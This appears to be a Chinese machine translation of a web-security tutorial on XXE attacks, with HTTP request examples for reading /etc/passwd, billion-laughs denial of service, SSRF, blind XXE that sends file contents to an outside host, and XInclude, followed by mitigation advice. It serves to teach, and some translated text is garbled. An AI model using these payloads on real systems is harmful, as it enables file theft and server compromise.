<html>
<head>
<title>XXE: Web App Security Basics</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">XXE:网络应用安全基础知识</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/xxe-web-app-security-basics-70ef8ed274f0?source=collection_archive---------3-----------------------#2020-10-11">https://infosecwriteups.com/xxe-web-app-security-basics-70ef8ed274f0?source=collection_archive---------3-----------------------#2020-10-11</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/0d44d57e2ed3fb2cbbabf2adaa4551e9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1392/format:webp/1*7eQyX2peHbksQnCTUbpl5Q.png"/></div></figure><p id="f35a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">XXE又名<strong class="jw ir"> XML外部实体</strong>是针对允许XML输入的应用程序的攻击，攻击者可以干扰应用程序的XML处理。如果攻击成功，攻击者可以查看服务器上的文件数据，并进行路径遍历、端口扫描、拒绝服务等多种攻击，甚至访问应用程序有权访问的内部机器(指SSRF攻击)。在<a class="ae ks" href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html" rel="noopener ugc nofollow" target="_blank"> OWASP Top 10 (2017) </a>中排名第四。</p><p id="cc2a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">这种脆弱性是如何产生的？</strong></p><p id="be5f" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当应用程序的弱配置XML解析器处理DTD(文档类型声明)时，即内部或外部，应用程序中很可能存在此漏洞。外部DTD更有趣，因为它们允许实体的值是文件路径或URL。</p><p id="024f" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">外部DTD示例:</p><pre class="kt ku kv kw gt kx ky kz la aw lb bi"><span id="da75" class="lc ld iq ky b gy le lf l lg lh">POST /home/ HTTP/1.1<br/>Host: www.idontknow.com</span><span id="c5e6" class="lc ld iq ky b gy li lf l lg lh">&lt;?xml version=”1.0" encoding=”UTF-8"?&gt;<br/>&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM “file:///etc/passwd”&gt; ]&gt;<br/>&lt;foo&gt;<br/> &amp;xxe;<br/>&lt;/foo&gt;</span></pre><p id="4cda" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">让我们深入了解一些基本信息:</p><p id="4ddb" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">什么是XML？</strong></p><p id="3eb8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">XML(可扩展标记语言)是一种标记语言，它定义了一组以人类可读和机器可读的格式编码文档的规则。它是像HTML一样的标记语言。这是非常自我描述的。</p><p id="b4c2" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">什么是DTD？</strong></p><p id="9cf8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">DTD代表文档类型定义。DTD的目的是定义XML文档的结构、合法元素和属性。DTD从here are two types of DTD declaration:</p><ul class=""><li id="1b57" class="lj lk iq jw b jx jy kb kc kf ll kj lm kn ln kr lo lp lq lr bi translated"><strong class="jw ir">内部DTD声明</strong>开始:当元素在XML中声明时。</li></ul><pre class="kt ku kv kw gt kx ky kz la aw lb bi"><span id="4642" class="lc ld iq ky b gy le lf l lg lh">&lt;!DOCTYPE test <br/>[ &lt;!ENTITY xxe "Vulnerability"&gt; <br/>]&gt;</span></pre><ul class=""><li id="d446" class="lj lk iq jw b jx jy kb kc kf ll kj lm kn ln kr lo lp lq lr bi translated"><strong class="jw ir">外部DTD声明</strong>:当元素在XML之外声明时。通过指定系统属性来访问它们，这些属性可以是合法的<em class="ls">。dtd </em>文件或有效的URL。</li></ul><pre class="kt ku kv kw gt kx ky kz la aw lb bi"><span id="b8e1" class="lc ld iq ky b gy le lf l lg lh">&lt;!DOCTYPE test <br/>[ &lt;!ENTITY xxe SYSTEM “any_dtd_file.dtd”&gt;<br/>]&gt;</span></pre><p id="acc8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">注意</strong>:XML规范不允许将外部实体与内部实体结合使用。</p><p id="ce87" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">现在进攻部分</strong>:</p><p id="63f4" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当应用程序的请求如下所示时:</p><pre class="kt ku kv kw gt kx ky kz la aw lb bi"><span id="4060" class="lc ld iq ky b gy le lf l lg lh">POST http://somesite.com/xml HTTP/1.1<br/><br/>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;!DOCTYPE data[<br/>  &lt;!ELEMENT Test ANY&gt;<br/>  &lt;!ENTITY xxe "Possible"&gt;<br/>]&gt;<br/>&lt;foo&gt;<br/>  &amp;xxe<strong class="ky ir">;</strong><br/>&lt;/foo&gt;</span></pre><p id="4ba2" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">得到的回答是:</p><pre class="kt ku kv kw gt kx ky kz la aw lb bi"><span id="3a24" class="lc ld iq ky b gy le lf l lg lh">HTTP/1.0 200 OK<br/> <br/>Possible</span></pre><p id="1583" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们可以在这里尝试不同的技术和有效载荷。</p><ul class=""><li id="b614" class="lj lk iq jw b jx jy kb kc kf ll kj lm kn ln kr lo lp lq lr bi translated"><strong class="jw ir">文件泄露</strong>:获取'/etc/passwd '文件的内容。</li></ul><pre class="kt ku kv kw gt kx ky kz la aw lb bi"><span id="8461" class="lc ld iq ky b gy le lf l lg lh">POST http://somesite.com/xml HTTP/1.1<br/><br/>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;!DOCTYPE data[<br/>  &lt;!ELEMENT Test ANY&gt;<br/>  &lt;!ENTITY xxe <!-- -->SYSTEM “file:///etc/passwd”&gt; <br/>]&gt;<br/>&lt;foo&gt;<br/>  &amp;xxe<strong class="ky ir">;</strong><br/>&lt;/foo&gt;</span></pre><ul class=""><li id="ff50" class="lj lk iq jw b jx jy kb kc kf ll kj lm kn ln kr lo lp lq lr bi translated"><strong class="jw ir">拒绝服务</strong>:泛指亿笑攻击。这个简单的有效载荷可以占用高达3gb的内存。</li></ul><pre class="kt ku kv kw gt kx ky kz la aw lb bi"><span id="ca28" class="lc ld iq ky b gy le lf l lg lh">POST http://somesite.com/xml HTTP/1.1</span><span id="7c3c" class="lc ld iq ky b gy li lf l lg lh">&lt;?xml version="1.0" ?&gt;<br/>&lt;!DOCTYPE lolz [&lt;!ENTITY lol "lol"&gt;&lt;!ELEMENT lolz (#PCDATA)&gt;<br/>&lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;<br/>&lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;<br/>&lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;<br/>&lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;<br/>&lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;<br/>&lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;<br/>&lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;<br/>&lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;<br/>&lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;<br/>&lt;foo&gt;<br/>  &amp;lol9;<br/>&lt;/foo&gt;</span></pre><ul class=""><li id="c51d" class="lj lk iq jw b jx jy kb kc kf ll kj lm kn ln kr lo lp lq lr bi translated"><strong class="jw ir"> SSRF(服务器端请求伪造)</strong>:攻击者可以从服务器向其他资源发送请求，以获取敏感信息。</li></ul><pre class="kt ku kv kw gt kx ky kz la aw lb bi"><span id="414d" class="lc ld iq ky b gy le lf l lg lh">POST http://somesite.com/xml HTTP/1.1<br/><br/>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;!DOCTYPE data[<br/>  &lt;!ELEMENT Test ANY&gt;<br/>  &lt;!ENTITY xxe <!-- -->SYSTEM “https://www.othersite.com/text.txt”&gt;<br/>]&gt;<br/>&lt;foo&gt;<br/>  &amp;xxe<strong class="ky ir">;</strong><br/>&lt;/foo&gt;</span></pre><ul class=""><li id="4027" class="lj lk iq jw b jx jy kb kc kf ll kj lm kn ln kr lo lp lq lr bi translated"><strong class="jw ir">盲XXE </strong>:当应用程序易受XXE攻击，但在其响应中不返回任何定义的外部实体的值时。</li></ul><pre class="kt ku kv kw gt kx ky kz la aw lb bi"><span id="e2bf" class="lc ld iq ky b gy le lf l lg lh">POST http://somesite.com/xml HTTP/1.1</span><span id="37b1" class="lc ld iq ky b gy li lf l lg lh">&lt;?xml version="1.0"?&gt;<br/>&lt;!DOCTYPE foo [<br/>  &lt;!ELEMENT Test ANY&gt;<br/>  &lt;!ENTITY % xxe SYSTEM "file:///etc/passwd"&gt;<br/>  &lt;!ENTITY blind SYSTEM "https://www.example.com/?%xxe;"&gt;<br/>]&gt;<br/>&lt;foo&gt;<br/>  &amp;blind;<br/>&lt;/foo&gt;</span></pre><ul class=""><li id="01a4" class="lj lk iq jw b jx jy kb kc kf ll kj lm kn ln kr lo lp lq lr bi translated"><strong class="jw ir"> XInclude </strong>:当应用程序从请求中获取数据并将其嵌入到服务器端的XML文档中时，XInclude攻击技术就会被利用。</li></ul><pre class="kt ku kv kw gt kx ky kz la aw lb bi"><span id="3c68" class="lc ld iq ky b gy le lf l lg lh">POST http://somesite.com/xml HTTP/1.1<br/><br/>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;<br/>  &lt;xi:include parse="text" href="file:///etc/passwd"/&gt;<br/>&lt;/foo&gt;</span></pre><p id="3ed4" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">缓解</strong>:</p><ul class=""><li id="95a5" class="lj lk iq jw b jx jy kb kc kf ll kj lm kn ln kr lo lp lq lr bi translated">禁止使用dtd。如果不可能，可以考虑<a class="ae ks" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" rel="noopener ugc nofollow" target="_blank"> OWASP XXE预防小抄</a>。</li><li id="e090" class="lj lk iq jw b jx lt kb lu kf lv kj lw kn lx kr lo lp lq lr bi translated">禁用对XInclude的支持。</li></ul><p id="0ddc" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">参考</strong>:</p><div class="ly lz gp gr ma mb"><a href="https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/" rel="noopener  ugc nofollow" target="_blank"><div class="mc ab fo"><div class="md ab me cl cj mf"><h2 class="bd ir gy z fp mg fr fs mh fu fw ip bi translated">什么是XML外部实体(XXE)攻击</h2><div class="mi l"><h3 class="bd b gy z fp mg fr fs mh fu fw dk translated">XML外部实体(XXE)攻击(有时称为XXE注入攻击)是一种滥用广泛的…</h3></div><div class="mj l"><p class="bd b dl z fp mg fr fs mh fu fw dk translated">www.acunetix.com</p></div></div><div class="mk l"><div class="ml l mm mn mo mk mp js mb"/></div></div></a></div><div class="ly lz gp gr ma mb"><a href="https://portswigger.net/web-security/xxe" rel="noopener  ugc nofollow" target="_blank"><div class="mc ab fo"><div class="md ab me cl cj mf"><h2 class="bd ir gy z fp mg fr fs mh fu fw ip bi translated">什么是XXE (XML外部实体)注入？教程和示例|网络安全学院</h2><div class="mi l"><h3 class="bd b gy z fp mg fr fs mh fu fw dk translated">在这一节中，我们将解释什么是XML外部实体注入，描述一些常见的例子，解释如何…</h3></div><div class="mj l"><p class="bd b dl z fp mg fr fs mh fu fw dk translated">portswigger.net</p></div></div><div class="mk l"><div class="mq l mm mn mo mk mp js mb"/></div></div></a></div><div class="ly lz gp gr ma mb"><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" rel="noopener  ugc nofollow" target="_blank"><div class="mc ab fo"><div class="md ab me cl cj mf"><h2 class="bd ir gy z fp mg fr fs mh fu fw ip bi translated">XML外部实体防护- OWASP备忘单系列</h2><div class="mi l"><h3 class="bd b gy z fp mg fr fs mh fu fw dk translated">XML外部实体注入(XXE)是一种攻击，现在通过A4点成为OWASP十大攻击之一</h3></div><div class="mj l"><p class="bd b dl z fp mg fr fs mh fu fw dk translated">cheatsheetseries.owasp.org</p></div></div></div></a></div></div></div>    
</body>
</html>